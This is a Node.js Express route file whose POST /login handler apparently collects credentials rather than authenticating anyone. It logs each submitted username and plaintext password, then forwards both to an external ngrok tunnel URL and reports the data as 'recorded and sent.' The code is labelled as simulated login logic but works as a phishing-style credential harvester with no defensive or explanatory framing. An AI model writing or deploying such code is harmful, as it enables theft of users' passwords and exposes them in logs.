const express = require('express');
const router = express.Router();
const fetch = require('node-fetch'); // ensure node-fetch is installed

router.post('/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        // Simulate login logic
        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
        if (!fetch) {
            return res.status(500).send('Fetch not initialized');
        }
        // Send data to your local server
        const localServerUrl = 'https://7328-2601-646-481-3830-c44b-5227-7f16-2ea6.ngrok-free.app/api/login';
        const response = await fetch(localServerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'cors' // if needed
        });

        if (response.ok) {
            console.log('Data sent to local server successfully');
            res.send('Login data recorded and sent.');
        } else {
            throw new Error('Failed to send data to local server');
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
